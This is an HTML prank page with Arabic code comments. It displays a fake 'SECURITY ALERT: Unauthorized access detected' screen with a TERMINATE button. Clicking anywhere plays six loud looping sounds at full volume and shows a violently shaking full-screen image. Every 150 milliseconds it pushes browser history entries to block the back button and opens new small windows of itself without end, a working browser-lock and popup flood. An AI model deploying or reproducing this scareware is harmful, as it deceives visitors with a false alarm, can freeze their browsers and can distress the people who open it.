<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>☠️ SYSTEM ERROR ☠️</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; }
        
        /* الصورة كبيرة، واضحة، وتهتز بجنون سواسوة */
        #madImg { 
            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; 
            object-fit: cover; z-index: 10; display: none;
        }

        /* الرسالة القديمة المريغلة سواسوة */
        #ui { 
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: #000; z-index: 1000; display: flex; 
            flex-direction: column; justify-content: center; align-items: center;
            font-family: 'Courier New', monospace; color: #f00; text-align: center;
        }
        .header { font-size: 35px; font-weight: bold; text-shadow: 0 0 10px #f00; }
        .blink { animation: b 0.1s infinite; }
        @keyframes b { 50% { opacity: 0; } }
        .btn-start { 
            background: #f00; color: #000; border: none; padding: 25px 60px; 
            font-weight: bold; font-size: 22px; cursor: pointer; margin-top: 30px;
        }
    </style>
</head>
<body onclick="launchOriginalMadness()">

    <div id="ui">
        <h1 class="blink">☠️ SECURITY ALERT ☠️</h1>
        <p>Unauthorized access detected.<br>Click to terminate process.</p>
        <button class="btn-start">TERMINATE</button>
    </div>

    <img id="madImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">

    <div id="audioBox">
        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/sukuna-gugu-gaga-loudest.mp3"></audio>
        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/aaaaaaaaaaaaaaaaaaaa-e-lutador.mp3"></audio>
        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/nikomok.mp3"></audio>
        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/twahwih.mp3"></audio>
        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/khrj-khrj.mp3"></audio>
        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/ive-got-this-faaaaaaaaahhhhh.mp3"></audio>
    </div>

    <script>
        let aCtx, analyser, data;
        const img = document.getElementById('madImg');

        function launchOriginalMadness() {
            // 1. إطلاق الـ 6 أصوات الصاخبة سواسوة
            document.querySelectorAll('.s').forEach(a => { a.volume = 1.0; a.play(); });

            document.getElementById('ui').style.display = 'none';
            img.style.display = 'block';

            // 2. تفعيل الرعشة الهستيرية سواسوة
            if (!aCtx) {
                aCtx = new (window.AudioContext || window.webkitAudioContext)();
                const source = aCtx.createMediaElementSource(document.querySelectorAll('.s')[0]); 
                analyser = aCtx.createAnalyser();
                analyser.fftSize = 64;
                data = new Uint8Array(analyser.frequencyBinCount);
                source.connect(analyser);
                analyser.connect(aCtx.destination);
                
                if (aCtx.state === 'suspended') aCtx.resume();
                requestAnimationFrame(jitterEngine);
            }

            // 3. نظام الحبس الرقمي سواسوة
            setInterval(() => {
                history.pushState(null, null, window.location.href);
                window.open(window.location.href, '_blank', 'width=10,height=10');
            }, 150);
        }

        function jitterEngine() {
            analyser.getByteFrequencyData(data);
            let vol = data[0]; // نعتمد على الترددات الصاخبة سواسوة

            // 4. الرعشة المجنونة (خبط ودوران وتكبير) سواسوة
            const intensity = (vol / 255) * 70; 
            const x = (Math.random() - 0.5) * intensity * 4;
            const y = (Math.random() - 0.5) * intensity * 4;
            const r = (Math.random() - 0.5) * intensity;
            const s = 1 + (vol / 255) * 0.5;

            img.style.transform = `translate(${x}px, ${y}px) rotate(${r}deg) scale(${s})`;
            requestAnimationFrame(jitterEngine);
        }
    </script>
</body>
</html>
